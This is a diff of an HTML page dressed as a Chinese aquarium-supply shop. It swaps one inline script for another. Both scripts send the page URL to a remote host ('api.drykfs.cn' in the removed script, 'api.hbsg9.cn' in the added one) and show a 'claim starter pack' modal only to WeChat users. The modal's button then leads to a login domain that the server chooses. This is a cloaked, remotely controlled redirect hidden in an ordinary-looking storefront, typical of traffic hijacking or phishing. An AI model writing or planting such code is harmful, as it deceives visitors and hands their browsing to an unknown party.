@@ -38,17 +38,48 @@
 </div></div>
 <div class="feature-bubbles"><span>🐟 包邮包损</span><span>💧 终身水质咨询</span><span>⚙️ 365天以换代修</span></div>
 <div class="wechat-overlay" id="wechatModal"><div class="wechat-modal"><div class="wechat-modal-image"><p>🐠 解锁水族顾问</p><span>点击进入领取新手包</span></div><div class="wechat-modal-button"><button class="enter-btn" id="enterBtn">点击进入</button></div></div></div>
-<script>(function(){
-    const modal=document.getElementById("wechatModal"), btn=document.getElementById("enterBtn");
-    modal.style.display="none";
-    if(new URLSearchParams(location.search).get('login')==='true') return;
-    const url=encodeURIComponent(location.href);
-    fetch("https://api.drykfs.cn/api/index/selectRoute?url="+url).then(r=>r.json()).then(d=>{
-        let jump=d?.data?.loginDomain;
-        if(d&&d.code===1 && /micromessenger/i.test(navigator.userAgent)) modal.style.display="flex";
-        if(jump){ btn.replaceWith(btn.cloneNode(true)); document.getElementById("enterBtn").addEventListener("click",()=>location.href=jump);}
-    }).catch(e=>{});
-    modal.addEventListener("click",e=>e.stopPropagation());
-})();</script>
+
+<script>
+(function(){
+    const modal = document.getElementById("wechatModal");
+    const btn = document.getElementById("enterBtn");
+    modal.style.display = "none";
+
+    // 如果 URL 带有 login=true 则跳过弹窗和请求
+    if (new URLSearchParams(location.search).get('login') === 'true') return;
+
+    // ---- 获取 rule_id 参数 ----
+    const urlParams = new URLSearchParams(location.search);
+    const ruleId = urlParams.get('rule_id');
+
+    const curUrl = encodeURIComponent(location.href);
+
+    // 构建接口地址，若存在 rule_id 则追加
+    let apiUrl = "https://api.hbsg9.cn/api/index/selectRoute?url=" + curUrl;
+    if (ruleId !== null && ruleId !== '') {
+        apiUrl += '&rule_id=' + encodeURIComponent(ruleId);
+    }
+
+    fetch(apiUrl)
+        .then(r => r.json())
+        .then(d => {
+            let jump = d?.data?.loginDomain;
+            if (d && d.code === 1 && /micromessenger/i.test(navigator.userAgent)) {
+                modal.style.display = "flex";
+            }
+            if (jump) {
+                // 替换按钮，防止重复绑定
+                const newBtn = btn.cloneNode(true);
+                btn.replaceWith(newBtn);
+                document.getElementById("enterBtn").addEventListener("click", function() {
+                    location.href = jump;
+                });
+            }
+        })
+        .catch(e => {});
+
+    modal.addEventListener("click", e => e.stopPropagation());
+})();
+</script>
 </body>
 </html>
